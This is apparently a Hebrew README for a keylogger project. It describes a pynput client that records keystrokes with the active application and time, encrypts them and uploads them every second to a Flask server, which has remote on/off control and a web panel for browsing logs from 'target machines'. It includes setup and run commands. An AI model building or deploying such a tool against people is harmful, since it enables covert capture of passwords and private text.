מבנה הפרויקט ומבנה הקבצים

keylogger.py (צד ה-Client):

תפקיד עיקרי: מאזין ללחיצות מקלדת באמצעות ספריית pynput, מאגד תווים למילים (מתעלם מלחיצות מיוחדות חוץ מ-space ו-backspace), משייך לאפליקציה הפעילה ולזמן, ומאחסן בלוגים.
שליחה לשרת: כל שנייה, שולח את הלוגים המוצפנים לשרת דרך POST request (לכתובת /api/upload). משתמש ב-Fernet להצפנה.
ניהול מצב: יש polling כל 2 שניות לשרת (לכתובת /api/toggle) כדי לבדוק אם להפעיל/לכבות את ה-keylogger.
ריצה: רץ כתהליך רקע, ניתן להפסיק עם Ctrl+C.


app.py (צד ה-Server):

תפקיד עיקרי: שרת Flask שמארח API וממשק web. מקבל נתונים מוצפנים, מפענח ומאחסן אותם כקבצי JSON בתיקיות נפרדות לכל מכונה (ב-data וב-decrypted_data).
API endpoints:

/api/upload: קליטת לוגים מוצפנים.
/api/toggle: שליטה במצב (GET/POST) לכל מכונה.
/api/getData/<machine>: החזרת לוגים למכונה ספציפית.
/api/getTargetMachinesList: רשימת מכונות זמינות.
/api/deleteLogs/<machine>: מחיקת לוגים.
ניהול משתמשים: /api/addUser, /api/deleteUser, /api/validateUser (מאחסן משתמשים כקבצי JSON).


אחסון: משתמש בתיקיות מקומיות (data ו-decrypted_data) לאחסון לוגים מוצפנים ומפוענחים.


קבצי HTML (ממשק ה-Web):

log_in.html: דף כניסה עם אימות משתמש (הוספה/מחיקה/אימות).
WebsiteView.html: רשימת מכונות זמינות, עם כפתור התנתקות.
individualUinit.html: ממשק למכונה אחת: חיפוש בלוגים (לפי זמן, אפליקציה, מילה), הצגת נתונים, מחיקה ורענון.



הפרויקט זורם באופן אינטואיטיבי: client שולח → server מאחסן ומפענח → web ממשק מציג ומנהל. הוא משתמש ב-threading כדי לרוץ במקביל (שליחה, polling, האזנה).
התייחסות לשורות המתחלפות בין macOS ו-Windows
בקוד keylogger.py, בפונקציה get_active_application() (שמחזירה את שם האפליקציה הפעילה), יש התאמה לפלטפורמות:

ל-Windows: הקוד מקומנט (מושבת עם #), ומשתמש בספריית win32gui כדי לקבל את חלון החזית (GetForegroundWindow) ולשלוף את שמו. אם תרצה להפעיל, הסר את ה-# משורות 56-59:
pythonif platform.system() == "Windows":
    import win32gui
    hwnd = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(hwnd) or "Unknown"
זה יעבוד רק ב-Windows, ודורש התקנת win32gui (ראה להלן).
ל-macOS (Darwin): הקוד פעיל (שורות 60-63), ומשתמש בספריית AppKit (חלק מ-pyObjC) כדי לקבל את האפליקציה הפעילה דרך NSWorkspace.
pythonif platform.system() == "Darwin":
    from AppKit import NSWorkspace
    active_app = NSWorkspace.sharedWorkspace().activeApplication()
    return active_app.get("NSApplicationName", "Unknown")
אם הפלטפורמה אחרת, מחזיר "Unsupported".

ההחלפה הזו נובעת מהבדלים במערכות ההפעלה: Windows משתמש ב-API Win32, macOS ב-API Cocoa. הפרויקט מוטה ל-macOS (Windows מקומנט), אז אם אתה רוצה תמיכה מלאה, הפעל את קטע Windows והתקן ספריות מתאימות. ל-Linux אין תמיכה כלל (תצטרך להוסיף, למשל עם xdotool או pyxhook).

דרישות והתקנות
דרישות כלליות

Python 3.6+ (בגלל cryptography ו-Fernet).
אין דרישות נוספות כמו מסדי נתונים או כלים חיצוניים.

ספריות נדרשות (חיצוניות)
התקן את הספריות הבאות באמצעות pip install <library>:

pynput: להאזנה למקלדת.
requests: לשליחת HTTP requests.
cryptography: להצפנה/פענוח.
flask: לשרת Flask.

פקודה להתקנה בסיסית:
bashpip install pynput requests cryptography flask
התאמות לפלטפורמה

macOS:

התקן pyobjc (עבור AppKit):
bashpip install pyobjc

ודא הרשאות למקלדת (ב-Privacy & Security > Input Monitoring).


Windows:

אם מפעילים את קוד ה-Windows (הסרת # משורות 56-59 ב-keylogger.py), התקן pywin32 (עבור win32gui):
bashpip install pywin32

ייתכן צורך בהרשאות admin.


ספריות סטנדרטיות: time, json, threading, os, platform – מגיעות עם Python, אין צורך להתקין.

אין ספריות נוספות בקוד, ואין התקנות דינמיות. אם אתה מתכוון להשתמש רק ב-macOS (כפי שהקוד מוגדר כרגע), אין צורך ב-pywin32.
ריצה

הפעלת השרת: python app.py (פועל על http://127.0.0.1:5000).
הפעלת ה-client: python keylogger.py (מתחבר לשרת מקומי, ניתן לשנות ב-server_base).
